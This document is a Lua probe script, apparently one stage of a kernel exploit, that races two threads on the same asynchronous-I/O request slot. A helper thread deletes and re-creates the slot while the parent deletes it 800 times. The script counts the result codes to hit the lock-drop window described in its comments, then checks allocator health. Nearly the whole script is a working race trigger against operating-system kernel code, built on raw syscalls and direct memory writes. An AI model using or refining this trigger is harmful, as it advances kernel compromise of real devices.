-- CRASH_CLASS: HIGH
-- PROBE 502h: one slot churns under a second thread while the parent deletes it
--
-- The vulnerable window is: the delete invalidates the slot and drops the table
-- lock, then re-reads the slot by index. Only a racing thread that both clears and
-- reallocates that same slot can be seen there. So both callers act on one id: the
-- helper deletes it and immediately creates a replacement, the parent deletes the
-- current id in a loop. Every parent delete is one attempt.
print("=== PROBE 502h: aio one-slot churn ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hx(a) return string.format("0x%X", a) end
local data = memory.alloc(0x200)
local out  = memory.alloc(0x40)
local idw  = memory.alloc(0x10)
local res1 = memory.alloc(0x40)
local res2 = memory.alloc(0x200)
local gate = memory.alloc(0x40)
local health = memory.alloc(0x10)
for o = 0, 0x3C, 4 do pcall(function() memory.write_dword(gate + o, 0) end) end
for o = 0, 0x1FC, 4 do pcall(function() memory.write_dword(data + o, 0) end) end
local D, O = hx(to_num(data)), hx(to_num(out))
local W, R1, R2 = hx(to_num(idw)), hx(to_num(res1)), hx(to_num(res2))
local G, H = hx(to_num(gate)), hx(to_num(health))

local body = ([[
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local c, d = make_syscall(669), make_syscall(662)
local DATA, OUT, IDW, RES, GATE = %s, %s, %s, %s, %s
local function rd(a) return to_num(memory.read_dword(a)) end
local function wr(a, v) pcall(function() memory.write_dword(a, v) end) end
while rd(GATE) == 0 do end
for i = 1, 800 do
  pcall(function() d(IDW, 1, RES) end)
  wr(OUT, 0)
  pcall(function() c(1, DATA, 1, 1, OUT) end)
  local nid = rd(OUT)
  if nid ~= 0 then wr(IDW, nid) end
  if i %% 50 == 0 then wr(GATE + 0x10, i) end
end
wr(GATE + 8, 1)
]]):format(D, O, W, R2, G)

local thr = run_lua_code_in_new_thread(body, { async = true })
local sc_c, sc_p, sc_d = make_syscall(669), make_syscall(664), make_syscall(662)
pcall(function() memory.write_dword(out, 0) end)
pcall(function() sc_c(1, uint64(D), 1, 1, uint64(O)) end)
local first = to_num(memory.read_dword(out))
pcall(function() memory.write_dword(idw, first) end)
pcall(function() sc_p(uint64(W), 1, uint64(R2)) end)
print("seed id=" .. first .. " poll=" .. tostring(to_num(memory.read_dword(res2))))
pcall(function() memory.write_dword(gate, 1) end)
local Z, MISS, GATE_ERR, OTHER = 0, 0, 0, 0
for i = 1, 800 do
  local ok, ret = pcall(function() return sc_d(uint64(W), 1, uint64(R1)) end)
  local st = to_num(memory.read_dword(res1))
  if ok then
    if st == 0 then Z = Z + 1
    elseif st == 0x80020003 then MISS = MISS + 1
    elseif st == 0x80020010 then GATE_ERR = GATE_ERR + 1
    else OTHER = OTHER + 1 end
  else
    OTHER = OTHER + 1
  end
  if i % 200 == 0 then
    print(string.format("i=%d helper=%d zero=%d missing=%d state=%d other=%d", i,
      to_num(memory.read_dword(gate + 0x10)), Z, MISS, GATE_ERR, OTHER))
  end
end
print(string.format("tally zero=%d missing=%d state=%d other=%d", Z, MISS, GATE_ERR, OTHER))
local spins = 0
while to_num(memory.read_dword(gate + 8)) == 0 and spins < 4000000 do spins = spins + 1 end
print("helper done=" .. tostring(to_num(memory.read_dword(gate + 8))))
local clean, bad = 0, 0
for i = 1, 8 do
  pcall(function() memory.write_dword(out, 0) end)
  pcall(function() sc_c(1, uint64(D), 1, 1, uint64(O)) end)
  local id = to_num(memory.read_dword(out))
  if id ~= 0 then
    pcall(function() memory.write_dword(health, id) end)
    pcall(function() sc_p(uint64(H), 1, uint64(R2)) end)
    local okd = pcall(function() return sc_d(uint64(H), 1, uint64(R1)) end)
    if okd and to_num(memory.read_dword(res1)) == 0 then clean = clean + 1 else bad = bad + 1 end
  else
    bad = bad + 1
  end
end
print(string.format("health: clean=%d bad=%d", clean, bad))
print("=== PROBE 502h COMPLETE ===")
